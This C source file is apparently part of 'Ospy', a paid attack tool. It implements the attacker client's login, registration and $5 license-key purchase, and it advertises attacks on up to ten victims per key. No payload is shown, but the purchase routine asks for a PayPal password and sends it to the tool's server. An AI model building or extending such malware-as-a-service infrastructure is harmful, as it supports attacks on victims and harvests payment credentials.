#include "entering_to_Ospy.h"
#include "connection.h"
#include "utilities.h"
#include "md5.h"

ENTERING_STATUS log_in_attacker(){
	
	ENTERING_STATUS received_status;
	main_data data;
	printf("\033[4;37m\033[1m\033[37mLog in -\033[0m\n");
	
	printf("Enter your user name : ");
	safe_scan(&data.login_to_Ospy.username, MAX_USER_NAME_LEN);

	printf("Enter you password : ");
	safe_scan(&data.login_to_Ospy.password, MAX_PASSWORD_LEN);
	
//	strcpy(data.login_to_Ospy.password, md5((unsigned char *) password_input, strlen(password_input)));
	
	A_2_S_encrypted_message_handler(data, LOG_IN);
	
	recv(attacker_socket, &received_status, sizeof(registration_status), 0);
	if(received_status == ENTERING_ACTION_SUCCESS){
		print_the_Hitchiker_image();
		printf("\n[\033[32;1m+\033[0m] \033[32;1mLogged in successfully !\033[0m moving to attack mode...\n");
		#ifdef USER_MESSAGE_PROMPT
		sleep(4);
		#endif
		return ENTERING_ACTION_SUCCESS;
	}
	printf("\n[\033[31;1m-\033[0m] \033[31;1mUnable to log in, please try again ...\033[0m\n");
	sleep(2);
	
	return ENTERING_ACTION_FAILURE;
}

ENTERING_STATUS register_attacker(){
	registration_status received_status;
	main_data data;
	
	char password_verification_input[MAX_PASSWORD_LEN];
	printf("\033[4;37m\033[1m\033[37mRegister -\033[0m\n");

	printf("Enter your license key (XXXX-XXXX-XXXX-XXXX) : ");
	safe_scan(&data.register_to_Ospay.license_key, LICENSE_KEY_LENGTH);
		
	printf("Enter your user name (no spaces) : ");
	safe_scan(&data.register_to_Ospay.username, MAX_USER_NAME_LEN);
		
	printf("Enter your password : ");
	safe_scan(&data.register_to_Ospay.password, MAX_PASSWORD_LEN);
		
	printf("verify your password : ");
	safe_scan(&password_verification_input, MAX_PASSWORD_LEN);
	
	if(strcmp(data.register_to_Ospay.password, password_verification_input) != 0){
		printf("\n[\033[31;1m-\033[0m] \033[31;1mPassword verification invalid, try again...\033[0m\n");
		sleep(2);
			
		return ENTERING_ACTION_FAILURE;
	}
	
//	strcpy(data.register_to_Ospay.license_key,license_key_input);
//	strcpy(data.register_to_Ospay.username,username_input);
//	strcpy(data.register_to_Ospay.password, md5((const unsigned char *) password_input, strlen(password_input)));
	A_2_S_encrypted_message_handler(data, REGISTER);
	recv(attacker_socket, &received_status, sizeof(registration_status),0);
	
	switch (received_status) {
		case REGISTERED_SUCCESSFULLY :
			
			printf("\n[\033[32;1m+\033[0m] \033[32;1mYou registered successfully !\033[0m\n");
			press_enter_to_continue();
			
			return ENTERING_ACTION_SUCCESS;
			
			break;
			
		case USERNAME_TAKEN :
			printf("\n[\033[31;1m-\033[0m] \033[31;1mUser name taken, please try again...\033[0m\n");
			sleep(3);
			
			return ENTERING_ACTION_FAILURE;
			
			break;
		
		case INVALID_USERNAME :
			
			printf("\n[\033[31;1m-\033[0m] \033[31;1mUser name is invalid , please try again...\033[0m\n");
			sleep(3);
			
			return ENTERING_ACTION_FAILURE;
			
			break;	
			
		case LICENES_KEY_INVALID :
			printf("\n[\033[31;1m-\033[0m] \033[31;1mlicense key invalid, please try again...\033[0m\n");
			sleep(3);
			
			return ENTERING_ACTION_FAILURE;
			
			break;
			
		default:
			printf("\n[\033[31;1m-\033[0m] \033[31;1mRegistered error...\033[0m\n");
			sleep(3);
			
			return ENTERING_ACTION_FAILURE;
			
			break;
	}
	return ENTERING_ACTION_FAILURE;
}
void buy_license_key(){
	FILE * license_key_save;
	main_data data;
	licenses_key_item received_license_key;
	printf("\033[4;37m\033[1m\033[37mByu license key -\033[0m\n");
	printf("Buy 1 license key for \033[32;1m5$\033[0m.\nFor 1 license key, you will be able to attack up to \033[4;37m10\033[0m victims\n");
	
	printf("Enter your Paypal account : ");
	safe_scan(&data.buy_license_key.username, MAX_USER_NAME_LEN);
		
	printf("Enter your Paypal password : ");
	safe_scan(&data.buy_license_key.password, MAX_PASSWORD_LEN);
		
	A_2_S_encrypted_message_handler(data, BUY_LICENSE_KEY);
	recv(attacker_socket, &received_license_key, sizeof(licenses_key_item), 0);
	
	print_large_banner();
	printf("\n[\033[32;1m+\033[0m] \033[1m\033[37mThank you for buying Ospy license key.\033[0m\n\n");
	printf("Your license key is : \033[32;1m%s\033[0m\n", received_license_key.licenses_key);
	copytoclipboard(received_license_key.licenses_key);
	printf("Please save it and use it when you will register to Ospy\n");
	printf("Also, you can find the license key in the \033[1m\033[37mclip board and in Ospy folder\033[0m\n");
	printf("\r[»] Ospy folder path : ");
	fflush(stdout);
	system("pwd");
	system("mkdir -p Ospy");
	license_key_save = fopen("Ospy/license_key.txt","wt");
	fputs(received_license_key.licenses_key, license_key_save);
	fclose(license_key_save);
	
	press_enter_to_continue();
}